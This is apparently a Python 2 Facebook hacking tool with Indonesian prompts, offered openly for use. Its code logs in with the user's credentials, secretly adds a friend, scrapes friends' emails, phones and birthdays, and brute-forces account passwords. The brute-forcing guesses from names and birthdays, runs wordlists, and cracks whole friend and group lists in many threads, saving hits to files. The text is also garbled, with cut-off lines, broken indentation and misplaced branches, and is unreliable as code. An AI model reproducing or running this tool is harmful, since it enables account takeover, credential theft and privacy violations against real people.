#WELCOME TO MR.XOX 
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, reques                       >
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/                       >

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\                       >

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
succeeded = []
cekpoint = []
failed = []
idfriend = []
idfromfriend= []
idmem = []
id = []
em = []
emfromfriend = []
hp = []
hpfromfriend = []
reaction = []
groupreaction = []
comment = []
groupcomment = []
grouplist = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN ACOUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FACEBOOK \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FACEBOOK \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] CONECTION NOT FOUND!'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONg>
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, >
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['a>
                os.system('xdg-open https://youtube.com/MR.AL_Xox')
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] CONNECTION NOT FOUND!'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAKUN KENA CHECKPOINT!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
        os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mAKUN TERKENA CHECKPOINT!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] CONNECTION NOT FOUND!'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
    print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
    print '\x1b[1;37;40m1. USER INFORMATION'
    print '\x1b[1;37;40m2. HACK ACOUN FACEBOOK'
    print '\x1b[1;37;40m3. BPT                 '
    print '\x1b[1;37;40m4. THE OTHER....       '
    print '\x1b[1;37;40m5. LOGOUT          '
    print '\x1b[1;31;40m0. EXIT               '
    print
    pilih()


def pilih():
    zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] JANGAN SAMPAI KOSONG!'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                menu_hack()
            else:
                if zedd == '3':
                    menu_bot()
                else:
                if zedd == '4':
                        lain()
                    else:
                        if zedd == '5':
                            os.system('rm -rf login.txt')
                            os.system('xdg-open https://www.youtube.com/nganunymous')
                            keluar()
                        else:
                            if zedd == '0':
                                keluar()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot found'
                                pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            try:
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mName \x1b[1;97m          : \x1b[1;91mNot found'
            else:
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'
                else:
                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'
                    else:
                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNummber Phone\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mNummber Phone\x1b[1;97m      : \x1b[1;91mNot found'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m        : ' + z['location']['n>
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m        : \x1b[1;91mNot found'

                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mYour school \x1b[1;97m       : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] The User not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. MINI HACK FACEBOOK(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m2. MULTI BRUTEFORCE FACEBOOK'
    print '\x1b[1;37;40m3. SUPER MULTIBRUTE FACEBOOK'
    print '\x1b[1;37;40m4. BRUTEFORCE(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m5. YAHOO CHACKET'
    print '\x1b[1;37;40m6. TAKE IT ID/EMAIL/PHONE'
    print '\x1b[1;31;40m0. BACK'
    print
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '\x1b[1;91m[!] JANGAN SAMPAI KOSONG!'
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
        hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    menu()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
                                    hack_pilih()


def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ]  The target account must be friends with you!'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mCheck in \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[+] \x1b[1;92mOpen Scurity \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease Waiting... \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0>
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                    print '\x1b[1;91m[!] \x1b[1;93mAKUN TERKENA CHECKPOINT!'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz1
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655>
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['na>
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz2
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                            print '\x1b[1;91m[!] \x1b[1;93mAKUN TERKENA CHECKPOINT!'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a>
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME \x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD \x1b[1;97m : ' + pz2
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=2377599>
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : '>
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz3
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAKUN TERKENA CHECKPOINT'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m    >
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz3
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token>
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m>
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz4
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[1;91m[+] \x1b[1;92mSucces Found.'
                                            print '\x1b[1;91m[!] \x1b[1;93mAKUN TERKENA CHECKPOINT!'
                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1>
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUSERNAME\x1b[1;97m : ' + id
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPASSWORD\x1b[1;97m : ' + pz4
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
                                            menu_hack()
                                            else:
                                            print '\x1b[1;91m[!] Sorry, failed to unlock the password :('
                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWaiting... \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File not found!'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()


def scrak():
    global back
    global Succesfull
    global cekpoint
    global Failed
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac2>
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97>
            sys.stdout.flush()
            except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'


def hasil():
    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack dari daftar Teman'
    print '\x1b[1;37;40m2. Crack dari member Grup'
    print '\x1b[1;31;40m0. Kembali'
    print
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 40 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' >
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&acc>
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu_hack()
                    else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0>
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655>
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=2377599>
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token>
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pas>
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' +>
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97>
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            sandi = open(passw, 'r')                                                                                             for pw in sandi:                                                                                                         try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' +>
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%2>
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:                                                                                               dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print 40 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print 40 * '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin membuat wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu_hack()
                else:
                    if why == 'T':
                        menu_hack()
                    else:
                        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
                        tanyaw()                                                                                     

def menu_yahoo():                                                                                                        os.system('clear')
    try:
        toket = open('login.txt', 'r').read()                                                                            except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'                                                                          os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Dari teman facebook'
    print '\x1b[1;37;40m2. Gunakan File'
    print '\x1b[1;31;40m0. Kembali'                                                                                      print
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Jangan kosong'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()                                                                                                      else:
                if go == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')                                                                                                   try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')                                            teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')                                                                                     print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
